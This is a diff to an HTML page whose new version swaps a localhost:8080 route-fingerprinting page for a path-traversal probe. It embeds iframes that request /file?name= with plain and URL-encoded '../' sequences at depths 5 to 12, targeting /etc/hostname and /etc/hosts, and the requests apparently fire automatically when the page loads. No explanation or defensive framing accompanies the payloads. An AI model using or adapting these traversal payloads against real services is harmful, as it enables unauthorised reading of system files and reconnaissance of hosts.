@@ -1,13 +1,12 @@
 <!doctype html>
-<html><head><meta charset="utf-8"><title>CAT CAS localhost 8080 fingerprint v16</title>
-<style>body{font:15px monospace}section{break-inside:avoid;margin:10px 0}iframe{width:100%;height:150px;border:2px solid #333}</style></head><body>
-<h1>CASI localhost:8080 route fingerprint</h1>
-<section><h2>1 health</h2><iframe src="http://127.0.0.1:8080/health"></iframe></section>
-<section><h2>2 healthz</h2><iframe src="http://127.0.0.1:8080/healthz"></iframe></section>
-<section><h2>3 status</h2><iframe src="http://127.0.0.1:8080/status"></iframe></section>
-<section><h2>4 version</h2><iframe src="http://127.0.0.1:8080/version"></iframe></section>
-<section><h2>5 metrics</h2><iframe src="http://127.0.0.1:8080/metrics"></iframe></section>
-<section><h2>6 api</h2><iframe src="http://127.0.0.1:8080/api"></iframe></section>
-<section><h2>7 swagger</h2><iframe src="http://127.0.0.1:8080/swagger/index.html"></iframe></section>
-<section><h2>8 openapi</h2><iframe src="http://127.0.0.1:8080/openapi.json"></iframe></section>
+<html><head><meta charset="utf-8"><title>CAT CAS 8080 traversal depth v17</title>
+<style>body{font:15px monospace}section{break-inside:avoid;margin:10px 0}iframe{width:100%;height:145px;border:2px solid #333}</style></head><body>
+<h1>CASI localhost:8080 file traversal depth</h1>
+<section><h2>1 depth 5 hostname</h2><iframe src="http://127.0.0.1:8080/file?name=../../../../../etc/hostname"></iframe></section>
+<section><h2>2 depth 6 hostname</h2><iframe src="http://127.0.0.1:8080/file?name=../../../../../../etc/hostname"></iframe></section>
+<section><h2>3 depth 8 hostname</h2><iframe src="http://127.0.0.1:8080/file?name=../../../../../../../../etc/hostname"></iframe></section>
+<section><h2>4 depth 10 hostname</h2><iframe src="http://127.0.0.1:8080/file?name=../../../../../../../../../../etc/hostname"></iframe></section>
+<section><h2>5 depth 12 hostname</h2><iframe src="http://127.0.0.1:8080/file?name=../../../../../../../../../../../../etc/hostname"></iframe></section>
+<section><h2>6 depth 8 hosts</h2><iframe src="http://127.0.0.1:8080/file?name=../../../../../../../../etc/hosts"></iframe></section>
+<section><h2>7 encoded depth 8 hostname</h2><iframe src="http://127.0.0.1:8080/file?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhostname"></iframe></section>
 </body></html>
